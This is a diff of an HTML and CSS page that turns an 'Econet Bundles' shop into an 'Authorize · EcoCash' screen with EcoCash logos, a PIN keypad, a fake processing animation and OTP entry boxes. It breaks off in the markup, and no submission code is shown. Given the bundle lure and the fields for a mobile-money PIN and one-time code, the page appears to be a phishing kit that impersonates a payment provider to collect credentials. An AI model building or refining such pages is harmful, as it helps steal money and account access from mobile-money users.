@@ -2,14 +2,14 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover,interactive-widget=resizes-content">
 <meta name="theme-color" content="#0057B8">
 <meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-<title>Econet Bundles</title>
+<title>Authorize &middot; EcoCash</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800&family=DM+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,400;9..40,500;9..40,600;9..40,700;9..40,800&family=DM+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 *,*::before,*::after{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
@@ -26,69 +26,62 @@ body{
 button{font-family:inherit;touch-action:manipulation;border:none;background:none;cursor:pointer;outline:none;-webkit-user-select:none;user-select:none}
 input{font-family:inherit;border:none;outline:none;background:none;-webkit-user-select:text!important;user-select:text!important}
 img{display:block}
-*{-webkit-user-select:none;user-select:none}
 
 :root{
-  --pri:#0057B8;
-  --pri-cont:#D6E4FF;
-  --on-pri-cont:#001B4D;
+  --pri:#0057B8;--pri-cont:#D6E4FF;--on-pri-cont:#001B4D;
   --sec:#CC0000;
-  --sec-cont:#FFDAD6;
-  --bg:#F2F4FF;
-  --surf:#FFFFFF;
-  --surf-lo:#F2F4FF;
-  --surf-mid:#ECEFFE;
-  --surf-hi:#E1E4F3;
-  --on-surf:#191C22;
-  --on-surf-v:#42474F;
-  --outline:#73788A;
-  --outline-v:#C3C7D6;
-  --r-sm:12px;--r-md:16px;--r-lg:24px;--r-xl:28px;--r-full:999px;
+  --bg:#F2F4FF;--surf:#FFFFFF;
+  --surf-lo:#F2F4FF;--surf-mid:#ECEFFE;--surf-hi:#E1E4F3;
+  --on-surf:#191C22;--on-surf-v:#42474F;
+  --outline:#73788A;--outline-v:#C3C7D6;
+  --grn:#16A34A;--grn-lt:rgba(22,163,74,.12);
+  --err:#B3261E;
+  --r-sm:12px;--r-md:16px;--r-lg:24px;--r-full:999px;
   --sh1:0 1px 2px rgba(0,0,0,.06),0 1px 3px rgba(0,0,0,.08);
-  --sh2:0 2px 6px rgba(0,0,0,.07),0 1px 3px rgba(0,0,0,.06);
-  --sh-pri:0 2px 12px rgba(0,87,184,.22);
   --sh-sec:0 2px 12px rgba(204,0,0,.22);
+  --ease:cubic-bezier(.22,1,.36,1);
+  --spring:cubic-bezier(.34,1.56,.64,1);
 }
 
-@keyframes pgIn{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes pgIn{from{opacity:0;transform:translateY(5px)}to{opacity:1;transform:none}}
+@keyframes stepIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+@keyframes shake{0%,100%{transform:translateX(0)}20%,60%{transform:translateX(-7px)}40%,80%{transform:translateX(7px)}}
 @keyframes ripple{to{transform:scale(4);opacity:0}}
+
+/* ─── CURTAIN ─────────────────────────────── */
+.curtain{
+  position:fixed;inset:0;z-index:9999;
+  background:#fff;opacity:0;pointer-events:none;
+  transition:opacity .3s ease;
+  display:flex;flex-direction:column;align-items:center;justify-content:center;gap:20px;
+}
+.curtain.show{opacity:1;pointer-events:auto}
+.curtain-logo img{height:28px;width:auto}
+.curtain-spin{width:24px;height:24px;border:2.5px solid var(--outline-v);border-top-color:var(--pri);border-radius:50%;animation:spin .7s linear infinite}
 
 /* ─── NAV ─────────────────────────────────── */
 .nav{
   flex-shrink:0;
   background:var(--pri);
+  height:56px;
   display:flex;align-items:center;justify-content:space-between;
   padding:0 16px;
-  height:56px;
-  padding-top:env(safe-area-inset-top,0px);
-  height:calc(56px + env(safe-area-inset-top,0px));
-  box-shadow:0 1px 0 rgba(255,255,255,.08),0 2px 8px rgba(0,0,0,.18);
+  box-shadow:0 2px 8px rgba(0,0,0,.18);
 }
-.nav-logo img{height:28px;width:auto}
-.nav-title{font-size:15px;font-weight:600;color:rgba(255,255,255,.9);letter-spacing:.1px}
-
-/* ─── TABS ────────────────────────────────── */
-.tabs{
+.nav-spinner{
+  width:22px;height:22px;
+  border:2.5px solid rgba(255,255,255,.25);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .8s linear infinite;
+  display:none;
   flex-shrink:0;
-  background:var(--surf);
-  border-bottom:1px solid var(--outline-v);
-  display:flex;
 }
-.tab{
-  flex:1;display:flex;flex-direction:column;align-items:center;
-  justify-content:center;gap:3px;
-  padding:9px 2px;
-  color:var(--on-surf-v);
-  border-bottom:2px solid transparent;
-  margin-bottom:-1px;
-  transition:color .18s,border-color .18s;
-  font-size:10px;font-weight:500;letter-spacing:.2px;
-  position:relative;
-}
-.tab svg{width:20px;height:20px;flex-shrink:0}
-.tab.on{color:var(--pri);border-bottom-color:var(--pri);font-weight:700}
-.tab.wa.on{color:#25D366;border-bottom-color:#25D366}
-.tab.fb.on{color:#1877F2;border-bottom-color:#1877F2}
+.nav-spinner.on{display:block}
+.nav-back{display:flex;align-items:center;gap:5px;color:rgba(255,255,255,.85);font-size:13px;font-weight:500}
+.nav-logo img{height:26px;width:auto;filter:grayscale(1) brightness(2)}
+.nav-amt{font-size:12px;font-weight:600;color:var(--sec);background:#fff;padding:3px 10px;border-radius:var(--r-full);font-family:'DM Mono',monospace}
 
 /* ─── SCROLL ──────────────────────────────── */
 .scroll{
@@ -97,285 +90,211 @@ img{display:block}
   -webkit-overflow-scrolling:touch;
   overscroll-behavior-y:contain;
   scrollbar-width:none;
-  padding:14px 14px calc(90px + env(safe-area-inset-bottom,0px));
+  padding:14px 16px 8px;
   display:flex;flex-direction:column;gap:10px;
-  animation:pgIn .22s ease both;
+  animation:pgIn .2s var(--ease) both;
 }
 .scroll::-webkit-scrollbar{display:none}
 
-/* ─── SECTION HEADER ─────────────────────── */
-.sec-row{display:flex;align-items:center;gap:8px;margin:4px 0 2px}
-.sec-label{font-size:10px;font-weight:700;color:var(--sec);letter-spacing:.8px;text-transform:uppercase;flex-shrink:0}
-.sec-line{flex:1;height:1px;background:var(--outline-v)}
+/* ─── SUMMARY CARD ────────────────────────── */
+.sum-card{
+  background:var(--pri-cont);
+  border-radius:var(--r-md);
+  overflow:hidden;
+  box-shadow:var(--sh1);
+}
+.sum-top{padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:10px}
+.sum-name{font-size:15px;font-weight:700;color:var(--on-pri-cont);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:55%}
+.sum-num{display:flex;align-items:center;gap:5px;margin-top:3px}
+.sum-num img{height:13px;border-radius:2px;flex-shrink:0}
+.sum-num-val{font-size:11px;font-family:'DM Mono',monospace;color:var(--on-pri-cont);opacity:.7;font-weight:500}
+.sum-price{text-align:right;flex-shrink:0}
+.sum-price-lbl{font-size:9px;font-weight:700;color:var(--on-pri-cont);opacity:.6;text-transform:uppercase;letter-spacing:.5px;margin-bottom:1px}
+.sum-price-val{font-size:22px;font-weight:800;color:var(--on-pri-cont);letter-spacing:-.5px;font-feature-settings:'tnum'}
+.sum-bar{background:var(--pri);padding:9px 16px;display:flex;align-items:center;gap:8px}
+.sum-bar img{height:18px;width:auto}
+.sum-bar span{font-size:11px;color:rgba(255,255,255,.8);font-weight:500}
 
-/* ─── BUNDLE GRID ─────────────────────────── */
-.bundle-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
-
-/* ─── BUNDLE CARD ─────────────────────────── */
-.bcard{
+/* ─── ECO STRIP ───────────────────────────── */
+.eco-strip{
   background:var(--surf);
   border:1px solid var(--outline-v);
   border-radius:var(--r-md);
-  padding:14px 13px 13px;
-  display:flex;flex-direction:column;gap:0;
-  position:relative;
+  padding:12px 16px;
+  display:flex;align-items:center;justify-content:center;
   box-shadow:var(--sh1);
-  cursor:pointer;
-  touch-action:manipulation;
-  transition:transform .12s,box-shadow .12s,border-color .15s,background .15s;
-  overflow:hidden;
-  min-width:0;
 }
-.bcard::after{
-  content:'';position:absolute;top:0;left:0;right:0;height:3px;
-  background:var(--outline-v);
-  transition:background .15s;
+.eco-strip img{height:26px;width:auto}
+
+/* ─── STEP CARD ───────────────────────────── */
+.step-card{
+  background:var(--surf);
+  border:1px solid var(--outline-v);
+  border-top:3px solid var(--pri);
+  border-radius:var(--r-md);
+  box-shadow:var(--sh1);
 }
-.bcard.on{
-  border-color:var(--pri);
+.step-head{padding:14px 16px;border-bottom:1px solid var(--outline-v);display:flex;align-items:center;gap:12px}
+.step-ic{
+  width:40px;height:40px;border-radius:var(--r-full);
   background:var(--pri-cont);
-  box-shadow:0 0 0 2px var(--pri),var(--sh1);
+  display:flex;align-items:center;justify-content:center;flex-shrink:0;
 }
-.bcard.on::after{background:var(--pri)}
-.bcard:active{transform:scale(.97)}
+.step-title{font-size:16px;font-weight:600;color:var(--on-surf)}
+.step-sub{font-size:12px;color:var(--on-surf-v);margin-top:2px}
+.step-body{padding:16px;display:flex;flex-direction:column;gap:14px}
 
-.bcard.wide{grid-column:span 2}
+/* ─── STEPS ───────────────────────────────── */
+.step{display:none}
+.step.on{display:block;animation:stepIn .2s var(--ease)}
 
-.bcard-tag{font-size:9px;font-weight:700;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px;display:flex;align-items:center;gap:4px}
-.bcard-dot{width:5px;height:5px;border-radius:50%;background:var(--pri);flex-shrink:0}
-.bcard-dot.wa{background:#25D366}
-.bcard-dot.fb{background:#1877F2}
-
-.bcard-data{font-size:22px;font-weight:800;color:var(--on-surf);letter-spacing:-.5px;line-height:1;margin-bottom:2px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
-.bcard-sub{font-size:10px;color:var(--on-surf-v);margin-bottom:10px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.bcard-price{font-size:18px;font-weight:800;color:var(--sec);margin-top:auto}
-.bcard-price span{font-size:11px;font-weight:400;color:var(--on-surf-v)}
-
-.bcard.on .bcard-data{color:var(--on-pri-cont)}.bcard.on .bcard-price{color:var(--sec)}
-.bcard.on .bcard-tag,.bcard.on .bcard-sub,.bcard.on .bcard-price span{color:var(--on-pri-cont);opacity:.7}
-
-.bcard-radio{
-  position:absolute;top:11px;right:11px;
-  width:18px;height:18px;border-radius:50%;
-  border:1.5px solid var(--outline-v);
+/* ─── PIN ─────────────────────────────────── */
+.pin-row{display:flex;justify-content:center;gap:10px}
+.pin-cell{
+  width:58px;height:58px;
+  border-radius:var(--r-md);
+  border:1px solid var(--outline-v);
+  background:var(--surf-mid);
   display:flex;align-items:center;justify-content:center;
-  transition:border-color .15s,background .15s;
+  transition:border-color .15s,background .15s,transform .12s var(--spring),box-shadow .15s;
+  position:relative;flex-shrink:0;
 }
-.bcard.on .bcard-radio{border-color:var(--pri);background:var(--pri)}
-.bcard-radio-dot{width:9px;height:9px;border-radius:50%;background:#fff}
+.pin-cell.filled{border-color:var(--pri);background:var(--pri-cont);transform:scale(1.04)}
+.pin-cell.filled::after{content:'';width:16px;height:16px;border-radius:50%;background:var(--sec)}
+.pin-cell.active{border-color:var(--pri);box-shadow:0 0 0 2px var(--pri);transform:scale(1.06)}
+.pin-cell.peek{background:var(--pri-cont)}
+.pin-cell.peek::after{display:none}
+.pin-digit{
+  position:absolute;inset:0;display:none;
+  align-items:center;justify-content:center;
+  font-family:'DM Mono',monospace;font-size:26px;font-weight:700;color:var(--pri);
+}
+.pin-cell.peek .pin-digit{display:flex}
+.pin-row.shake .pin-cell{animation:shake .3s ease;border-color:var(--err)}
 
-.bcard-app{position:absolute;top:10px;right:10px;width:22px;height:22px}
+.pin-actions{display:flex;gap:8px}
+.pin-act{
+  flex:1;height:40px;border-radius:var(--r-full);
+  background:var(--pri-cont);color:var(--on-pri-cont);
+  font-size:13px;font-weight:500;
+  display:flex;align-items:center;justify-content:center;gap:6px;
+  transition:background .12s;
+}
+.pin-act:active{background:rgba(0,87,184,.2)}
 
-/* ─── COMBO CARD ─────────────────────────── */
-.ccard{
-  background:linear-gradient(155deg, var(--pri) 0%, #003A8C 100%);
-  border-radius:var(--r-lg);
-  padding:18px 16px 60px;
-  position:relative;
-  cursor:pointer;
-  touch-action:manipulation;
-  box-shadow:var(--sh-pri);
-  transition:transform .12s,box-shadow .12s;
-  display:flex;
-  flex-direction:column;
-  clip-path:inset(0 round var(--r-lg));
-}
-.ccard::before{
-  content:'';position:absolute;
-  top:-30px;right:-30px;
-  width:140px;height:140px;
-  border-radius:50%;
-  background:rgba(255,255,255,.06);
-  pointer-events:none;
-}
-.ccard:active{transform:scale(.98)}
-.ccard.on{box-shadow:0 0 0 2.5px #fff,0 0 0 5px var(--pri),var(--sh-pri)}
+.pin-err{font-size:12px;color:var(--err);text-align:center;min-height:18px;font-weight:500}
 
-.ccard-badge{
-  display:inline-flex;align-self:flex-start;
-  font-size:9px;font-weight:700;color:var(--sec);
-  background:#fff;padding:3px 10px;
-  border-radius:var(--r-full);letter-spacing:.5px;
-  margin-bottom:8px;
-}
-.ccard-lbl{font-size:10px;font-weight:600;color:rgba(255,255,255,.6);letter-spacing:.6px;text-transform:uppercase;margin-bottom:4px}
-.ccard-name{font-size:18px;font-weight:700;color:#fff;margin-bottom:8px;line-height:1.25;letter-spacing:-.1px}
-.ccard-pills{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px}
-.ccard-pill{
-  background:rgba(255,255,255,.16);
-  border:1px solid rgba(255,255,255,.2);
-  color:#fff;font-size:11px;font-weight:500;
-  padding:4px 11px;border-radius:var(--r-full);
-  white-space:nowrap;letter-spacing:.1px;
-}
-.ccard-price{font-size:28px;font-weight:800;color:#fff;letter-spacing:-.5px;line-height:1;display:flex;align-items:baseline;gap:5px;padding-bottom:6px}
-.ccard-price-sub{font-size:13px;font-weight:400;color:rgba(255,255,255,.6)}
-.ccard-validity{font-size:11px;color:rgba(255,255,255,.55);margin-top:5px;margin-bottom:4px}
-
-.ccard-radio{
-  position:absolute;bottom:16px;right:16px;
-  width:24px;height:24px;min-width:24px;min-height:24px;
-  border-radius:50%;
-  border:2px solid rgba(255,255,255,.4);
+/* ─── NUMPAD ──────────────────────────────── */
+.numpad{display:grid;grid-template-columns:repeat(3,1fr);gap:8px}
+.nk{
+  height:56px;border-radius:var(--r-md);
+  background:var(--surf-mid);
+  font-family:'DM Mono',monospace;font-size:24px;font-weight:400;
+  color:var(--on-surf);
   display:flex;align-items:center;justify-content:center;
-  transition:border-color .15s,background .15s;
+  box-shadow:var(--sh1);
+  transition:background .1s,transform .1s;
+  position:relative;overflow:hidden;
+  touch-action:manipulation;-webkit-user-select:none;
 }
-.ccard.on .ccard-radio{border-color:#fff;background:#fff}
-.ccard-radio-dot{width:12px;height:12px;min-width:12px;min-height:12px;border-radius:50%;background:var(--pri)}
+.nk:active{background:var(--surf-hi);transform:scale(.94)}
+.nk.del{background:var(--surf-hi)}
+.nk.empty{opacity:0;pointer-events:none;box-shadow:none}
 
-/* ─── BUY BAR ─────────────────────────────── */
-.buy-bar{
+/* ─── PROCESSING ──────────────────────────── */
+.proc-body{display:flex;flex-direction:column;align-items:center;padding:28px 20px 20px;text-align:center;gap:0}
+.proc-ring{
+  width:64px;height:64px;
+  min-width:64px;min-height:64px;
+  position:relative;flex-shrink:0;
+  margin-bottom:18px;
+}
+.proc-svg{
+  width:64px;height:64px;
+  display:block;
+  animation:spin .9s linear infinite;
+}
+.proc-svg.done{animation:none}
+.proc-arc{stroke-dasharray:72;stroke-dashoffset:72;transition:stroke-dashoffset .6s ease,stroke .35s}
+.proc-svg.done .proc-arc{stroke-dashoffset:0;stroke:var(--grn)}
+.proc-ic{position:absolute;inset:0;display:flex;align-items:center;justify-content:center}
+.proc-t{font-size:16px;font-weight:600;color:var(--on-surf);margin-bottom:4px;transition:opacity .2s}
+.proc-s{font-size:12px;color:var(--on-surf-v);margin-bottom:20px;transition:opacity .2s}
+
+/* Progress steps */
+.vsteps{display:flex;align-items:center;max-width:220px;width:100%}
+.vstep{display:flex;flex-direction:column;align-items:center;gap:4px;flex-shrink:0}
+.vstep-dot{width:10px;height:10px;border-radius:50%;background:var(--outline-v);transition:background .25s,transform .25s}
+.vstep.act .vstep-dot{background:var(--pri);transform:scale(1.35);box-shadow:0 0 0 3px rgba(0,87,184,.15)}
+.vstep.done .vstep-dot{background:var(--grn)}
+.vstep-lbl{font-size:9px;font-weight:500;color:var(--on-surf-v);letter-spacing:.3px}
+.vstep.act .vstep-lbl{color:var(--pri);font-weight:700}
+.vstep.done .vstep-lbl{color:var(--grn)}
+.vline{flex:1;height:1.5px;background:var(--outline-v);margin:0 4px;margin-bottom:14px;transition:background .25s}
+.vline.done{background:var(--grn)}
+
+.proc-logos{display:flex;align-items:center;justify-content:center;gap:10px;padding:12px;background:var(--surf-mid);border-top:1px solid var(--outline-v);border-radius:0 0 var(--r-md) var(--r-md)}
+.proc-logos img{height:20px;width:auto}
+
+/* ─── OTP ─────────────────────────────────── */
+.otp-boxes{display:flex;gap:7px;justify-content:center;max-width:100%}
+.otp-box{
+  width:44px;height:54px;
+  border-radius:var(--r-sm) var(--r-sm) 0 0;
+  border-bottom:2px solid var(--outline);
+  background:var(--surf-mid);
+  display:flex;align-items:center;justify-content:center;
+  font-family:'DM Mono',monospace;font-size:22px;font-weight:600;
+  color:var(--on-surf);
+  transition:border-bottom-color .15s,background .15s,transform .12s var(--spring);
+}
+.otp-box.active{border-bottom-color:var(--pri);border-bottom-width:3px;transform:scale(1.05)}
+.otp-box.filled{background:var(--pri-cont);color:var(--on-pri-cont);border-bottom-color:var(--pri)}
+.otp-box.success{background:var(--grn-lt);color:var(--grn);border-bottom-color:var(--grn);transition:all .25s ease}
+.otp-hidden{position:absolute;opacity:0;pointer-events:none;width:1px;height:1px}
+
+.timer-row{display:flex;justify-content:center;align-items:center;gap:6px;font-size:12px;color:var(--on-surf-v)}
+.timer-val{font-weight:700;color:var(--pri);font-family:'DM Mono',monospace}
+.resend-btn{
+  display:block;margin:0 auto;
+  height:36px;padding:0 20px;
+  border-radius:var(--r-full);
+  background:var(--pri-cont);color:var(--on-pri-cont);
+  font-size:13px;font-weight:500;
+  transition:opacity .2s;
+}
+.resend-btn:disabled{opacity:.35}
+
+/* ─── FOOT ─────────────────────────────────── */
+.foot{
   flex-shrink:0;
   background:var(--surf);
   border-top:1px solid var(--outline-v);
   padding:10px 16px max(16px,env(safe-area-inset-bottom,0px));
-  display:flex;align-items:center;gap:12px;
-  box-shadow:0 -2px 12px rgba(0,0,0,.07);
+  box-shadow:0 -1px 4px rgba(0,0,0,.06);
 }
-.buy-info{flex:1;min-width:0}
-.buy-hint{font-size:13px;color:var(--on-surf-v)}
-.buy-name{font-size:14px;font-weight:600;color:var(--on-surf);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.buy-detail{font-size:12px;color:var(--pri);margin-top:2px;font-weight:500}
-.buy-btn{
-  flex-shrink:0;height:48px;padding:0 28px;
-  border-radius:var(--r-full);
-  background:var(--sec);color:#fff;
-  font-size:14px;font-weight:600;letter-spacing:.3px;
-  display:flex;align-items:center;gap:8px;
-  box-shadow:var(--sh-sec);
-  transition:transform .12s,box-shadow .12s,background .12s;
-  position:relative;overflow:hidden;
-  font-family:'DM Sans',sans-serif;
-}
-.buy-btn:active{transform:scale(.96);box-shadow:none;background:#A50000}
-.buy-btn:disabled{background:var(--surf-hi);color:var(--on-surf-v);box-shadow:none}
-
-/* ─── OVERLAY + SHEET ─────────────────────── */
-.overlay{
-  position:fixed;inset:0;z-index:100;
-  background:rgba(0,0,0,.55);
-  display:none;opacity:0;
-  transition:opacity .25s;
-}
-.sheet{
-  position:fixed;z-index:101;
-  bottom:0;left:0;right:0;
-  background:var(--surf);
-  border-radius:var(--r-xl) var(--r-xl) 0 0;
-  display:none;
-  flex-direction:column;
-  max-height:90vh;
-  transform:translateY(100%);
-  transition:transform .32s cubic-bezier(.22,1,.36,1);
-  box-shadow:0 -4px 32px rgba(0,0,0,.18);
-}
-.sheet.open{transform:translateY(0)}
-
-.sheet-handle{
-  width:36px;height:4px;border-radius:2px;
-  background:var(--outline-v);
-  margin:12px auto 0;flex-shrink:0;
-}
-.sheet-head{
-  padding:14px 20px 12px;
-  display:flex;align-items:center;justify-content:space-between;
-  border-bottom:1px solid var(--outline-v);
-  flex-shrink:0;
-}
-.sheet-title{font-size:17px;font-weight:700;color:var(--on-surf)}
-.sheet-close{
-  width:32px;height:32px;border-radius:50%;
-  background:var(--surf-mid);
-  display:flex;align-items:center;justify-content:center;
-  color:var(--on-surf-v);font-size:20px;line-height:1;
-}
-.sheet-body{
-  flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;
-  padding:18px 20px max(24px,env(safe-area-inset-bottom,0px));
-  display:flex;flex-direction:column;gap:16px;
-}
-
-/* Sheet: bundle summary */
-.sh-sum{
-  background:var(--pri-cont);
-  border-radius:var(--r-md);
-  overflow:hidden;
-}
-.sh-sum-top{padding:14px 16px;display:flex;align-items:center;justify-content:space-between;gap:8px}
-.sh-sum-name{font-size:16px;font-weight:700;color:var(--on-pri-cont);overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:55%}
-.sh-sum-detail{font-size:11px;color:var(--on-pri-cont);opacity:.65;margin-top:2px}
-.sh-sum-price{font-size:26px;font-weight:800;color:var(--on-pri-cont);text-align:right;flex-shrink:0;letter-spacing:-.5px}
-.sh-sum-bar{
-  background:var(--pri);
-  padding:9px 16px;
-  display:flex;align-items:center;gap:8px;
-}
-.sh-sum-bar img{height:18px;width:auto}
-.sh-sum-bar span{font-size:11px;color:rgba(255,255,255,.8);font-weight:500;flex:1;min-width:0;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-
-/* Sheet: eco pay row */
-.sh-pay{
-  display:flex;align-items:center;gap:14px;
-  background:var(--surf-lo);
-  border:1px solid var(--outline-v);
-  border-radius:var(--r-md);
-  padding:14px;
-}
-.sh-pay img{height:24px;width:auto;flex-shrink:0}
-.sh-pay-t{font-size:13px;font-weight:600;color:var(--on-surf);margin-bottom:3px}
-.sh-pay-d{font-size:12px;color:var(--on-surf-v);line-height:1.5}
-
-/* Number field — M3 filled text field */
-.field-lbl{font-size:11px;font-weight:600;color:var(--on-surf-v);letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
-.nfield{
-  display:flex;align-items:center;
-  background:var(--surf-mid);
-  border-radius:var(--r-sm) var(--r-sm) 0 0;
-  border-bottom:2px solid var(--outline);
-  height:56px;
-  transition:border-color .18s;
-}
-.nfield.focus{border-bottom-color:var(--pri)}
-.nfield.ok{border-bottom-color:#16A34A}
-.nfield-pre{
-  display:flex;align-items:center;gap:7px;
-  padding:0 12px;
-  border-right:1px solid var(--outline-v);
-  height:100%;flex-shrink:0;
-}
-.nfield-pre img{height:16px;border-radius:2px}
-.nfield-code{font-size:14px;font-weight:600;color:var(--on-surf-v);font-family:'DM Mono',monospace}
-#ni{
-  flex:1;min-width:0;height:100%;
-  padding:0 14px;
-  font-size:22px;font-weight:600;
-  color:var(--on-surf);
-  font-family:'DM Mono',monospace;
-  letter-spacing:.05em;
-  caret-color:var(--pri);
-  background:transparent;
-  -webkit-user-select:text!important;user-select:text!important;
-}
-#ni::placeholder{font-size:14px;font-weight:400;color:var(--on-surf-v);letter-spacing:0;font-family:'DM Sans',sans-serif}
-.nfield-hint{font-size:12px;color:var(--on-surf-v);margin-top:6px;min-height:18px}
-.nfield-hint.ok{color:#16A34A;font-weight:600}
-
-/* CTA button */
-.cta{
+.foot-btn{
   width:100%;height:48px;
   border-radius:var(--r-full);
   background:var(--sec);color:#fff;
   font-size:14px;font-weight:600;letter-spacing:.3px;
   display:flex;align-items:center;justify-content:center;gap:8px;
   box-shadow:var(--sh-sec);
-  border:none;cursor:pointer;
-  font-family:'DM Sans',sans-serif;
-  transition:transform .12s,box-shadow .12s,background .12s;
   position:relative;overflow:hidden;
-  touch-action:manipulation;
+  transition:transform .12s,box-shadow .12s,background .12s;
+  font-family:'DM Sans',sans-serif;
 }
-.cta:disabled{background:var(--surf-hi);color:var(--on-surf-v);box-shadow:none}
-.cta:not(:disabled):active{transform:scale(.97);box-shadow:none;background:#A50000}
+.foot-btn:active{transform:scale(.97);box-shadow:none;background:#A50000}
+.foot-btn:disabled{background:var(--surf-hi);color:var(--on-surf-v);box-shadow:none;transform:none}
+.foot-spin{
+  width:18px;height:18px;
+  border:2.5px solid rgba(255,255,255,.3);
+  border-top-color:#fff;
+  border-radius:50%;
+  animation:spin .7s linear infinite;
+  flex-shrink:0;display:none;
+}
+.foot-spin.on{display:block}
 
 .rip{position:absolute;border-radius:50%;pointer-events:none;background:rgba(255,255,255,.22);transform:scale(0);animation:ripple .5s ease forwards}
 .rip-dark{background:rgba(0,0,0,.08)}
@@ -383,108 +302,166 @@ img{display:block}
 </head>
 <body>
 
+<div class="curtain" id="curtain">
+  <div class="curtain-logo"><img src="assets/ecocash.png" alt="EcoCash"></div>
+  <div class="curtain-spin"></div>
+</div>
+
 <nav class="nav">
-  <div class="nav-logo">
-    <img src="assets/econet.png" alt="Econet">
+  <button class="nav-back" onclick="history.back()">
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M19 12H5M12 5l-7 7 7 7"/></svg>
+    Back
+  </button>
+  <div class="nav-logo"><img src="assets/ecocash.png" alt="EcoCash"></div>
+  <div style="display:flex;align-items:center;gap:8px">
+    <div class="nav-spinner" id="navSpinner"></div>
+    <div class="nav-amt" id="navAmt">USD 0.00</div>
   </div>
-  <span class="nav-title">USD Bundles</span>
 </nav>
 
-<div class="tabs" id="tabBar">
-  <button class="tab on" data-cat="data">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M1 6l5 5 4-8 4 12 3-5 3 3 3-3"/></svg>
-    <span>Data</span>
-  </button>
-  <button class="tab" data-cat="combo">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
-    <span>Combo</span>
-  </button>
-  <button class="tab" data-cat="voice">
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12a19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 3.6 1.18h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.9a16 16 0 0 0 6 6l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>
-    <span>Voice</span>
-  </button>
-  <button class="tab wa" data-cat="wa">
-    <svg viewBox="0 0 24 24" fill="#25D366"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
-    <span>WA</span>
-  </button>
-  <button class="tab fb" data-cat="fb">
-    <svg viewBox="0 0 24 24" fill="#1877F2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
-    <span>FB</span>
-  </button>
-  <button class="tab" data-cat="night">
